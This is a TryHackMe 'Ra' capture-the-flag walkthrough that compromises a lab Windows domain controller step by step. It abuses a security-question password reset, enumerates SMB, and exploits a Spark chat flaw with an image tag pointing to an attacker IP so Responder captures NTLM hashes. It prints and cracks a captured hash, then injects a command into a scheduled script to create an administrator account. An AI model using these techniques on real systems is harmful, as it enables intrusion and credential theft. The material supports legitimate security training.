# [Ra](https://tryhackme.com/room/ra)

## You have found WindCorp's internal network and their Domain Controller. Can you pwn their network?

# Ra

## You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!). Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?

### Flag 1

1. Start by scanning all ports on the target to identify open services

```bash
nmap -p- <TARGET_IP>
```

[SCREEN01]

2. When examining the network traffic in the browser developer tools on `<TARGET_IP>:80`, you'll notice failed requests to `fire.windcorp.thm:9090`. This indicates there's another service running on a different subdomain. Add both domains to your `/etc/hosts` file

```bash
echo "<TARGET_IP> fire.windcorp.thm" >> /etc/hosts
echo "<TARGET_IP> windcorp.thm" >> /etc/hosts
```

[SCREEN02]

3. Navigate to `fire.windcorp.thm:9090` and examine the password reset functionality. One of security questions is: **"What is/was your favorite pet's name?"**. Back on the main website (`<TARGET_IP>`), examine the images. One image shows Lily with her dog and is named `lilyLeAndSparky.jpg`. This suggests "Sparky" is the pet's name we need.

[SCREEN03]

4. Use the password reset form at `fire.windcorp.thm/reset.asp`:
   - Username: `lilyle`
   - Security answer: `Sparky`
   - New password: `ChangeMe#1234`

[SCREEN04]

[SCREEN05]

5. Now that we have valid credentials, enumerate SMB shares and download available files

```bash
smbclient -L <TARGET_IP> -U lilyle
smbclient //<TARGET_IP>/Shared -U lilyle
ls
prompt off
mget *
```

[SCREEN06]

[SCREEN07]

6. This downloads all files from the Shared directory, including our first flag.

```bash
cat Flag\ 1.txt
```

[SCREEN08]

---

### Flag 2

1. From the SMB share, we obtained a Spark client installer. Install it and configure for the attack

```bash
sudo dpkg -i spark_2_8_3.deb
spark
```

2. Go to **Advanced** settings and check:
   - **Accept all certificates**
   - **Disable certificate hostname verification**

This allows us to connect despite certificate issues.

[SCREEN09]

3. Configure the connection:
   - Username: `lilyle`
   - Domain: `windcorp.thm`
   - Password: `ChangeMe#1234`

[SCREEN10]

4. If Spark crashes due to audio system problems, install required packages

```bash
sudo apt install -y pulseaudio alsa-utils libasound2-dev
pulseaudio --start
```

5. We'll exploit a known vulnerability in Spark client that allows capturing NTLM hashes through image injection. Reference: https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md

6. Start Responder to capture NTLM authentication attempts

```bash
sudo responder -I tun0
```

7. In the Spark chat, send an image tag that points to your attacking machine: `<img src="http://<ATTACKER_IP>/test.jpg">`. When other users view this message, their clients will attempt to authenticate to your machine.

8. Responder captures the NTLM hash from user `buse`. Save it to a file

```bash
echo "buse::WINDCORP:581eb034fb28c39c:54A0D21F2C7F9C9FC662887D404ADBE6:01010000000000003016F4F0AEBAD6019F1E18DD6C6FF8DD000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000D06AF3C0BE5C4909A34ED0E1314D4F4E9E879FB75EC17102D80D7E32C45E88740A00100000000000000000000000000000000000090000000000000000000000" > hash
```

9. Use John the Ripper to crack the captured hash
   - This reveals the password: `uzunLM+3131`

```bash
john hash --wordlist=/root/Tools/wordlists/rockyou.txt
```

[SCREEN11]

10. Use the cracked credentials to connect via WinRM and retrieve Flag 2

```bash
evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'
cd C:\Users\buse\Desktop
dir
type 'Flag 2.txt'
```

[SCREEN12]

---

### Flag 3

1. Explore the system to find automation scripts that might be exploitable

```bash
cd ../../../
cd scripts
dir
more checkservers.ps1
```

This reveals a PowerShell script that runs periodically and processes a file owned by user `brittanycr@windcorp.thm`.

[SCREEN13]

2. Since we have access through our current session, reset brittanycr's password

```bash
net user brittanycr ChangeMe#1234
```

3. Create a payload that will add a new administrative user when the script executes

```bash
echo 'net user sid ChangeMe#1234 /add;net localgroup Administrators sid /add' > hosts.txt
```

4. Use SMB to upload our malicious file to brittanycr's directory where the script will process it

```bash
smbclient //windcorp.thm/Users -U brittanycr ChangeMe#1234
cd brittanycr
put hosts.txt
```

5. Wait for the scheduled script to execute, then connect as the newly created administrative user

```bash
evil-winrm -i windcorp.thm -u sid -p 'ChangeMe#1234'
cd ..
more Flag3.txt
```
